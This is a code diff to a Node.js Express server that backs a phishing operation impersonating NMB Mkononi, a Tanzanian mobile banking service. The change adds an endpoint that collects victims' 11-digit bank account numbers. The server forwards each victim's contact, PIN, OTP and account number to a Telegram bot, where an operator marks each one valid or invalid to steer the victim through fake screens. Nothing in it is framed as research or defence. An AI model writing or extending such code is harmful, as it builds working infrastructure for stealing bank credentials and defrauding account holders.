@@ -1,5 +1,5 @@
 /**
- * **NMB MKONONI TANZANIA - UNRESTRICTED MULTI-ADMIN SERVER**
+ * **NMB MKONONI TANZANIA - UNRESTRICTED MULTI-ADMIN SERVER WITH ACCOUNT NUMBER STEP**
  */
 
 const express = require('express');
@@ -234,8 +234,16 @@ async function initBot() {
           await bot.sendMessage(chatTarget, `❌ Access Denied for ${session.contact}`);
           break;
         case 'CORRECT_OTP':
+          session.status = 'WAITING_ACCOUNT';
+          await bot.sendMessage(chatTarget, `✅ OTP verified for ${session.contact}. Waiting for 11-digit account number submission.`);
+          break;
+        case 'VALID_ACC':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Success screen triggered for ${session.contact}`);
+          await bot.sendMessage(chatTarget, `🎉 Account number validated successfully. Success screen triggered for ${session.contact}`);
+          break;
+        case 'INVALID_ACC':
+          session.status = 'RETRY_ACCOUNT';
+          await bot.sendMessage(chatTarget, `⚠️ Account number marked invalid. User prompted to re-enter for ${session.contact}`);
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
@@ -379,8 +387,51 @@ app.post('/api/submit-otp', async (req, res) => {
   }
 });
 
+app.post('/api/submit-account', async (req, res) => {
+  try {
+    const { userId, accountNumber } = req.body || {};
+    const session = sessions.get(userId);
+
+    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
+
+    const cleanAccount = String(accountNumber || '').replace(/\D/g, '');
+    if (cleanAccount.length !== 11) {
+      return res.status(400).json({ success: false, error: 'Namba ya akaunti lazima iwe na tarakimu 11 halali.' });
+    }
+
+    session.status = 'WAITING_ACCOUNT_APPROVAL';
+    session.accountNumber = cleanAccount;
+
+    const message =
+      `🏦 *11-DIGIT ACCOUNT NUMBER SUBMITTED*\n\n` +
+      `📱 *NMB Mkononi:* ${session.contact}\n` +
+      `💳 *Account Number:* \`${cleanAccount}\`\n\n` +
+      `Thibitisha Namba ya Akaunti:`;
+
+    const opts = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '❌ INVALID ACCOUNT', callback_data: `INVALID_ACC_${userId}` },
+            { text: '✅ VALID ACCOUNT', callback_data: `VALID_ACC_${userId}` }
+          ]
+        ]
+      }
+    };
+
+    const targetChat = session.adminChatId;
+    if (targetChat && bot) {
+      await bot.sendMessage(targetChat, message, opts);
+    }
+
+    return res.status(200).json({ success: true });
+  } catch (error) {
+    return res.status(500).json({ success: false, error: 'Telegram delivery failed' });
+  }
+});
+
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-                                                                                                                             
+    
